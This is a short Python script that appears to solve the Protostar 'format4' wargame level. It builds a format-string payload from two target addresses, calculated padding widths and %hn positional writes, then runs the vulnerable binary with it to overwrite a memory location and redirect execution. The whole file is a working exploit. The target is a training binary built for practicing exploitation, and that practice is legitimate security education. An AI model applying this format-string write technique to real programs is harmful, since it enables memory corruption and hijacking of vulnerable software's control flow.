import subprocess

program = "/opt/protostar/bin/format4"
target1 = "\x08\x04\x97\x24"[::-1]
target2 = "\x08\x04\x97\x26"[::-1]

length1 = 0x0804-len(target1)-len(target2)
data1 = '%.'+str(length1)+'d'
# -1 for decimal point
data2 = '%.'+str(0x84b4-length1-len(target1)-len(target2)-1)+'d'

string = target1+target2+data1+"%5$hn"+data2+"%4$hn"
print(repr(string))

process = subprocess.Popen([program, string], stdin=subprocess.PIPE)
process.communicate(string+'\n')
